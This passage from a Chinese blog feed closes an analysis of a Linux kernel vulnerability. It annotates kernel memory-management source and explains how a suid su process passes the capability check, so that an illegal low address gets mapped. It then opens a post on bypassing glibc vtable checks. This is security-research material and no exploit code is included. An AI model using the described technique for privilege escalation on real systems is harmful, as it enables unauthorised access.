copy_from_user_page(vma, page, addr,</span><br><span class="line">						    buf, maddr + offset, bytes);</span><br><span class="line">			&#125;</span><br><span class="line">			kunmap(page);</span><br><span class="line">			put_page(page);</span><br><span class="line">		&#125;</span><br><span class="line">		len -= bytes;</span><br><span class="line">		buf += bytes;</span><br><span class="line">		addr += bytes;</span><br><span class="line">	&#125;</span><br><span class="line">	up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> buf - old_buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后的关键点在<code>get_user_pages_remote</code>中，这个函数顺利完成我们才能调用<code>kmap</code>将地址映射出来</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_user_pages_remote</span><span class="params">(struct task_struct *tsk, struct mm_struct *mm,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span></span></span><br><span class="line"><span class="function"><span class="params">		struct vm_area_struct **vmas, <span class="keyword">int</span> *locked)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __get_user_pages_locked(tsk, mm, start, nr_pages, pages, vmas,</span><br><span class="line">				       locked, <span class="literal">true</span>,</span><br><span class="line">				       gup_flags | FOLL_TOUCH | FOLL_REMOTE);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(get_user_pages_remote);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">long</span> __get_user_pages_locked(struct task_struct *tsk,</span><br><span class="line">						struct mm_struct *mm,</span><br><span class="line">						<span class="keyword">unsigned</span> <span class="keyword">long</span> start,</span><br><span class="line">						<span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">						struct page **pages,</span><br><span class="line">						struct vm_area_struct **vmas,</span><br><span class="line">						<span class="keyword">int</span> *locked, <span class="keyword">bool</span> notify_drop,</span><br><span class="line">						<span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">long</span> ret, pages_done;</span><br><span class="line">	<span class="keyword">bool</span> lock_dropped;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (locked) &#123;</span><br><span class="line">		<span class="comment">/* if VM_FAULT_RETRY can be returned, vmas become invalid */</span></span><br><span class="line">		BUG_ON(vmas);</span><br><span class="line">		<span class="comment">/* check caller initialized locked */</span></span><br><span class="line">		BUG_ON(*locked != <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pages)</span><br><span class="line">		flags |= FOLL_GET;</span><br><span class="line"></span><br><span class="line">	pages_done = <span class="number">0</span>;</span><br><span class="line">	lock_dropped = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		ret = __get_user_pages(tsk, mm, start, nr_pages, flags, pages,</span><br><span class="line">				       vmas, locked);<span class="comment">//将另一个进程从addr开始之后的1个页固定到内存中，并将他们的指针写入&amp;page中，返回固定的页数</span></span><br><span class="line">		<span class="keyword">if</span> (!locked)</span><br><span class="line">			<span class="comment">/* VM_FAULT_RETRY couldn't trigger, bypass */</span></span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* VM_FAULT_RETRY cannot return errors */</span></span><br><span class="line">		<span class="keyword">if</span> (!*locked) &#123;</span><br><span class="line">			BUG_ON(ret &lt; <span class="number">0</span>);</span><br><span class="line">			BUG_ON(ret &gt;= nr_pages);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pages)</span><br><span class="line">			<span class="comment">/* If it's a prefault don't insist harder */</span></span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (ret &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			nr_pages -= ret;</span><br><span class="line">			pages_done += ret;</span><br><span class="line">			<span class="keyword">if</span> (!nr_pages)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (*locked) &#123;</span><br><span class="line">			<span class="comment">/* VM_FAULT_RETRY didn't trigger */</span></span><br><span class="line">			<span class="keyword">if</span> (!pages_done)</span><br><span class="line">				pages_done = ret;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/* VM_FAULT_RETRY triggered, so seek to the faulting offset */</span></span><br><span class="line">		pages += ret;</span><br><span class="line">		start += ret &lt;&lt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Repeat on the address that fired VM_FAULT_RETRY</span></span><br><span class="line"><span class="comment">		 * without FAULT_FLAG_ALLOW_RETRY but with</span></span><br><span class="line"><span class="comment">		 * FAULT_FLAG_TRIED.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		*locked = <span class="number">1</span>;</span><br><span class="line">		lock_dropped = <span class="literal">true</span>;</span><br><span class="line">		down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">		ret = __get_user_pages(tsk, mm, start, <span class="number">1</span>, flags | FOLL_TRIED,</span><br><span class="line">				       pages, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret != <span class="number">1</span>) &#123;</span><br><span class="line">			BUG_ON(ret &gt; <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span> (!pages_done)</span><br><span class="line">				pages_done = ret;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		nr_pages--;</span><br><span class="line">		pages_done++;</span><br><span class="line">		<span class="keyword">if</span> (!nr_pages)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		pages++;</span><br><span class="line">		start += PAGE_SIZE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (notify_drop &amp;&amp; lock_dropped &amp;&amp; *locked) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * We must let the caller know we temporarily dropped the lock</span></span><br><span class="line"><span class="comment">		 * and so the critical section protected by it was lost.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">		*locked = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pages_done;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里其实没太懂为啥两次<code>__get_user_pages</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">		struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">long</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> page_mask;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!nr_pages)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If FOLL_FORCE is set then do not force a full fault as the hinting</span></span><br><span class="line"><span class="comment">	 * fault information is unrelated to the reference behaviour of a task</span></span><br><span class="line"><span class="comment">	 * using the address space</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))</span><br><span class="line">		gup_flags |= FOLL_NUMA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> foll_flags = gup_flags;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> page_increm;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* first iteration or cross vma bound */</span></span><br><span class="line">		<span class="keyword">if</span> (!vma || start &gt;= vma-&gt;vm_end) &#123;</span><br><span class="line">			vma = find_extend_vma(mm, start); <span class="comment">//查找vma</span></span><br><span class="line">			<span class="keyword">if</span> (!vma &amp;&amp; in_gate_area(mm, start)) &#123;</span><br><span class="line">				<span class="keyword">int</span> ret;</span><br><span class="line">				ret = get_gate_page(mm, start &amp; PAGE_MASK,</span><br><span class="line">						gup_flags, &amp;vma,</span><br><span class="line">						pages ? &amp;pages[i] : <span class="literal">NULL</span>);</span><br><span class="line">				<span class="keyword">if</span> (ret)</span><br><span class="line">					<span class="keyword">return</span> i ? : ret;</span><br><span class="line">				page_mask = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))</span><br><span class="line">				<span class="keyword">return</span> i ? : -EFAULT;</span><br><span class="line">			<span class="keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;</span><br><span class="line">				i = follow_hugetlb_page(mm, vma, pages, vmas,</span><br><span class="line">						&amp;start, &amp;nr_pages, i,</span><br><span class="line">						gup_flags);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">retry:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If we have a pending SIGKILL, don't keep faulting pages and</span></span><br><span class="line"><span class="comment">		 * potentially allocating memory.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line">			<span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">		cond_resched();</span><br><span class="line">		page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);	<span class="comment">//从用户空间地址即start查找页面描述符</span></span><br><span class="line">		<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">			<span class="keyword">int</span> ret;</span><br><span class="line">			ret = faultin_page(tsk, vma, start, &amp;foll_flags,</span><br><span class="line">					nonblocking);</span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">goto</span> retry;</span><br><span class="line">			<span class="keyword">case</span> -EFAULT:</span><br><span class="line">			<span class="keyword">case</span> -ENOMEM:</span><br><span class="line">			<span class="keyword">case</span> -EHWPOISON:</span><br><span class="line">				<span class="keyword">return</span> i ? i : ret;</span><br><span class="line">			<span class="keyword">case</span> -EBUSY:</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			<span class="keyword">case</span> -ENOENT:</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line">			BUG();</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Proper page table entry exists, but no corresponding</span></span><br><span class="line"><span class="comment">			 * struct page.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">goto</span> next_page;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(page)) &#123;</span><br><span class="line">			<span class="keyword">return</span> i ? i : PTR_ERR(page);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (pages) &#123;</span><br><span class="line">			pages[i] = page;</span><br><span class="line">			flush_anon_page(vma, page, start);</span><br><span class="line">			flush_dcache_page(page);</span><br><span class="line">			page_mask = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">next_page:</span><br><span class="line">		<span class="keyword">if</span> (vmas) &#123;</span><br><span class="line">			vmas[i] = vma;</span><br><span class="line">			page_mask = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		page_increm = <span class="number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);</span><br><span class="line">		<span class="keyword">if</span> (page_increm &gt; nr_pages)</span><br><span class="line">			page_increm = nr_pages;</span><br><span class="line">		i += page_increm;</span><br><span class="line">		start += page_increm * PAGE_SIZE;</span><br><span class="line">		nr_pages -= page_increm;</span><br><span class="line">	&#125; <span class="keyword">while</span> (nr_pages);</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>find_extend_vma</code>函数用来查找<code>vma</code></p>
<p>似乎因为<code>CONFIG_STACK_GROWSUP</code>配置的定义与否，会用两种不同的<code>find_extend_vma</code>函数</p>
<p>这里我们所需要的函数是未定义<code>CONFIG_STACK_GROWSUP</code>配置的那个函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">find_extend_vma</span>(<span class="title">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>, <span class="title">unsigned</span> <span class="title">long</span> <span class="title">addr</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> start;</span><br><span class="line"></span><br><span class="line">	addr &amp;= PAGE_MASK;</span><br><span class="line">	vma = find_vma(mm, addr); <span class="comment">//查找对应的vma</span></span><br><span class="line">	<span class="keyword">if</span> (!vma)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (vma-&gt;vm_start &lt;= addr)</span><br><span class="line">		<span class="keyword">return</span> vma;</span><br><span class="line">	<span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	start = vma-&gt;vm_start;</span><br><span class="line">	<span class="keyword">if</span> (expand_stack(vma, addr))	<span class="comment">//走到这里是因为addr不在任何已存的vma的范围内，就需要扩展vma</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (vma-&gt;vm_flags &amp; VM_LOCKED)</span><br><span class="line">		populate_vma_page_range(vma, addr, start, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> vma;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">expand_stack</span><span class="params">(struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">	address &amp;= PAGE_MASK;</span><br><span class="line">	prev = vma-&gt;vm_prev;</span><br><span class="line">	<span class="keyword">if</span> (prev &amp;&amp; prev-&gt;vm_end == address) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!(prev-&gt;vm_flags &amp; VM_GROWSDOWN))</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> expand_downwards(vma, address);	<span class="comment">//主要是这个函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">expand_downwards</span><span class="params">(struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">vma</span>-&gt;<span class="title">vm_mm</span>;</span></span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">	address &amp;= PAGE_MASK;</span><br><span class="line">	error = security_mmap_addr(address);	<span class="comment">//漏洞就在这个函数里面</span></span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We must make sure the anon_vma is allocated. */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(anon_vma_prepare(vma)))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * vma-&gt;vm_start/vm_end cannot change under us because the caller</span></span><br><span class="line"><span class="comment">	 * is required to hold the mmap_sem in read mode.  We need the</span></span><br><span class="line"><span class="comment">	 * anon_vma lock to serialize against concurrent expand_stacks.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	anon_vma_lock_write(vma-&gt;anon_vma);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Somebody else might have raced and expanded it already */</span></span><br><span class="line">	<span class="keyword">if</span> (address &lt; vma-&gt;vm_start) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> size, grow;</span><br><span class="line"></span><br><span class="line">		size = vma-&gt;vm_end - address;</span><br><span class="line">		grow = (vma-&gt;vm_start - address) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">		error = -ENOMEM;</span><br><span class="line">		<span class="keyword">if</span> (grow &lt;= vma-&gt;vm_pgoff) &#123;</span><br><span class="line">			error = acct_stack_growth(vma, size, grow);</span><br><span class="line">			<span class="keyword">if</span> (!error) &#123;</span><br><span class="line">				<span class="comment">/*</span></span><br><span class="line"><span class="comment">				 * vma_gap_update() doesn't support concurrent</span></span><br><span class="line"><span class="comment">				 * updates, but we only hold a shared mmap_sem</span></span><br><span class="line"><span class="comment">				 * lock here, so we need to protect against</span></span><br><span class="line"><span class="comment">				 * concurrent vma expansions.</span></span><br><span class="line"><span class="comment">				 * anon_vma_lock_write() doesn't help here, as</span></span><br><span class="line"><span class="comment">				 * we don't guarantee that all growable vmas</span></span><br><span class="line"><span class="comment">				 * in a mm share the same root anon vma.</span></span><br><span class="line"><span class="comment">				 * So, we reuse mm-&gt;page_table_lock to guard</span></span><br><span class="line"><span class="comment">				 * against concurrent vma expansions.</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">				spin_lock(&amp;mm-&gt;page_table_lock);</span><br><span class="line">				<span class="keyword">if</span> (vma-&gt;vm_flags &amp; VM_LOCKED)</span><br><span class="line">					mm-&gt;locked_vm += grow;</span><br><span class="line">				vm_stat_account(mm, vma-&gt;vm_flags, grow);</span><br><span class="line">				anon_vma_interval_tree_pre_update_vma(vma);</span><br><span class="line">				vma-&gt;vm_start = address;</span><br><span class="line">				vma-&gt;vm_pgoff -= grow;</span><br><span class="line">				anon_vma_interval_tree_post_update_vma(vma);</span><br><span class="line">				vma_gap_update(vma);</span><br><span class="line">				spin_unlock(&amp;mm-&gt;page_table_lock);</span><br><span class="line"></span><br><span class="line">				perf_event_mmap(vma);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	anon_vma_unlock_write(vma-&gt;anon_vma);</span><br><span class="line">	khugepaged_enter_vma_merge(vma, vma-&gt;vm_flags);</span><br><span class="line">	validate_mm(mm);</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞就在<code>security_mmap_addr</code>函数里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_mmap_addr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> cap_mmap_addr(addr); <span class="comment">//检查是否能mmap指定的addr，其实就是对addr的合法性检查</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cap_mmap_addr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (addr &lt; dac_mmap_min_addr) &#123;</span><br><span class="line">		ret = cap_capable(current_cred(), &amp;init_user_ns, CAP_SYS_RAWIO,</span><br><span class="line">				  SECURITY_CAP_AUDIT);  <span class="comment">//确定任务是否有特定的有效性，即确定任务是否有权限可以被执行</span></span><br><span class="line">		<span class="comment">/* set PF_SUPERPRIV if it turns out we allow the low mmap */</span></span><br><span class="line">		<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">			current-&gt;flags |= PF_SUPERPRIV;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果按照<code>Poc</code>运行的话，由于<code>su</code>是一个<code>suid</code>程序，故在运行它的时候权限会被提到<code>su</code>的所有者即<code>root</code>权限，那么这里<code>current_cred()</code>返回的就是<code>root</code>的<code>cred</code>，所以这里的检查一定会过</p>
<p>这里的检查一过，那么我们所请求的内存空间就会被顺利的申请出来</p>
<p>所以，我们本身先设置FILE结构体中的指针指向我们所请求的对普通用户而言不合法的地址，例如0x9000，然后用su的输出来FILE进行写操作，经过一系列检查，最终申请出来vma并映射这些地址到内存，感觉上类似缺页之后分配页但实际不是</p>
<h1 id="vma"><a href="#vma" class="headerlink" title="vma"></a>vma</h1><p><code>vma</code>即<code>Virtual Memory Area</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> &#123;</span></span><br><span class="line">	<span class="comment">/* The first cache line has the info for VMA tree walking. */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_start;		<span class="comment">/* Our start address within vm_mm. */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_end;		<span class="comment">/* The first byte after our end address</span></span><br><span class="line"><span class="comment">					   within vm_mm. */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* linked list of VM areas per task, sorted by address */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vm_next</span>, *<span class="title">vm_prev</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">vm_rb</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Largest free memory gap in bytes to the left of this VMA.</span></span><br><span class="line"><span class="comment">	 * Either between this VMA and vma-&gt;vm_prev, or between one of the</span></span><br><span class="line"><span class="comment">	 * VMAs below us in the VMA rbtree and its -&gt;vm_prev. This helps</span></span><br><span class="line"><span class="comment">	 * get_unmapped_area find a free area of the right size.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> rb_subtree_gap;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Second cache line starts here. */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span>	<span class="comment">/* The address space we belong to. */</span></span><br><span class="line">	<span class="keyword">pgprot_t</span> vm_page_prot;		<span class="comment">/* Access permissions of this VMA. */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_flags;		<span class="comment">/* Flags, see mm.h. */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For areas with an address space and backing store,</span></span><br><span class="line"><span class="comment">	 * linkage into the address_space-&gt;i_mmap interval tree.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">rb</span>;</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> rb_subtree_last;</span><br><span class="line">	&#125; shared;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * A file's MAP_PRIVATE vma can be in both i_mmap tree and anon_vma</span></span><br><span class="line"><span class="comment">	 * list, after a COW of one of the file pages.	A MAP_SHARED vma</span></span><br><span class="line"><span class="comment">	 * can only be in the i_mmap tree.  An anonymous MAP_PRIVATE, stack</span></span><br><span class="line"><span class="comment">	 * or brk vma (with NULL file) can only be in an anon_vma list.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anon_vma_chain</span>;</span> <span class="comment">/* Serialized by mmap_sem &amp;</span></span><br><span class="line"><span class="comment">					  * page_table_lock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">anon_vma</span> *<span class="title">anon_vma</span>;</span>	<span class="comment">/* Serialized by page_table_lock */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Function pointers to deal with this struct. */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Information about our backing store: */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_pgoff;		<span class="comment">/* Offset (within vm_file) in PAGE_SIZE</span></span><br><span class="line"><span class="comment">					   units */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">vm_file</span>;</span>		<span class="comment">/* File we map to (can be NULL). */</span></span><br><span class="line">	<span class="keyword">void</span> * vm_private_data;		<span class="comment">/* was vm_pte (shared mem) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_region</span> *<span class="title">vm_region</span>;</span>	<span class="comment">/* NOMMU mapping region */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span> *<span class="title">vm_policy</span>;</span>	<span class="comment">/* NUMA policy for the VMA */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_userfaultfd_ctx</span> <span class="title">vm_userfaultfd_ctx</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>This struct defines a memory VMM memory area. There is one of these per VM-area/task.  A VM area is any part of the process virtual memory space that has a special rule for the page-fault handlers (ie a shared library, the executable area etc).</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个漏洞的原因并不复杂，是<code>suid</code>程序引发的问题，但是一路分析过来却比较困难，因为对类似<code>vma</code>，<code>mm</code>等变量的了解不够，导致分析起来比较困难</p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过2.24以后libc对vtable的检查</title>
    <url>/2020/03/29/%E7%BB%95%E8%BF%872-24%E4%BB%A5%E5%90%8Elibc%E5%AF%B9vtable%E7%9A%84%E6%A3%80%E6%9F%A5/</url>
    <content><![CDATA[<p>glibc-2.24之后添加了对vtable的检查，如果想继续通过vtable来劫持程序执行流程，则需要其他的骚操作</p>
<p>这里以glibc-2.24来说明，以fclose为例</p>
<a id="more"></a>

<h1 id="fclose源码"><a href="#fclose源码" class="headerlink" title="fclose源码"></a>fclose源码</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> fclose(fp) _IO_new_fclose (fp)</span></span><br></pre></td></tr></table></figure>

